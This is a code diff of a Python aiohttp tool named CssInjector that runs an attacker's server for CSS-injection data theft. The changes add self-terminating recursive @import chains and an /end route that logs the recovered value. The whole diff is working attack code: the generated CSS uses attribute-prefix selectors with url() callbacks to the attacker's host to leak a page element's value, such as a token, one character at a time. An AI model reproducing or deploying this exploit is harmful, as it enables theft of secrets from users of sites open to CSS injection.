@@ -1,9 +1,10 @@
 import argparse
 import string
 import time
+import random
+import urllib.parse
 from aiohttp import web
 import asyncio
-import urllib.parse
 
 
 class CssInjector:
@@ -14,11 +15,11 @@ class CssInjector:
 
     def log(self, status: str, message: str):
         if status == "ok":
-            print(f"\33[0;32m[ ✓ ]\033[0m {message}")
+            print(f"\33[0;32m[✓]\033[0m {message}")
         elif status == "info":
-            print(f"\33[0;36m[ ⓘ ]\033[0m {message}")
+            print(f"\33[0;36m[ⓘ]\033[0m {message}")
         elif status == "error":
-            print(f"\33[0;31m[ ✗ ]\033[0m {message}")
+            print(f"\33[0;31m[✗]\033[0m {message}")
 
     def set_parser(self):
         parser = argparse.ArgumentParser(
@@ -38,12 +39,6 @@ class CssInjector:
             required=True,
             help="CSS identifier (CSS selector) to extract data",
         )
-        parser.add_argument(
-            "-l",
-            "--length",
-            required=True,
-            help="length of data to extract",
-        )
         return parser
 
     def start(self):
@@ -55,33 +50,33 @@ class CssInjector:
         self.identifier = args.identifier
         self.hostname = args.hostname
         self.port = args.port
-        self.length = args.length
         self.app = web.Application()
         self.app.middlewares.append(self.dynamic_router_middleware)
         self.log("ok", f"Attacker's server started on {args.hostname}:{args.port}")
         web.run_app(self.app, port=self.port)
 
     def generate_injection(self):
-        stri = f"""{"".join(map(lambda x: f'{self.identifier}[value^={repr(self.token+x)}]{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.token+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"))}"""
+        stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
+        stri += f'{self.identifier}[value={repr(self.token)}]{"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/end") !important;}}'
+        stri += f"""{"".join(map(lambda x: f'{self.identifier}[value^={repr(self.token+x)}]{"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.token+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"))}"""
         return stri
 
     async def handle_start(self, request):
         self.log("ok", f"Connection from {request.remote}")
+        self.event.set()
         return web.Response(
-            text="\n".join(
-                [
-                    f"@import url('//{self.hostname}:{self.port}/next?num={i}'); "
-                    for i in range(int(self.length))
-                ]
-            ),
+            text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
             content_type="text/css",
         )
 
+    async def handle_end(self, request):
+        self.log("ok", f"The token is : {self.token}")
+        return web.Response(text="End.", status=503)
+
     async def handle_next(self, request):
-        if int(request.query.get("num")) > len(self.token):
-            if not self.event.is_set():
-                await self.event.wait()
-            self.event.clear()
+        if not self.event.is_set():
+            await self.event.wait()
+        self.event.clear()
         return web.Response(text=self.generate_injection(), content_type="text/css")
 
     async def handle_valid(self, request):
@@ -100,6 +95,8 @@ class CssInjector:
                 return await self.handle_next(request)
             elif path.startswith("/valid"):
                 return await self.handle_valid(request)
+            elif path.startswith("/end"):
+                return await self.handle_end(request)
 
             return web.Response(text="404: Not Found", status=404)
 
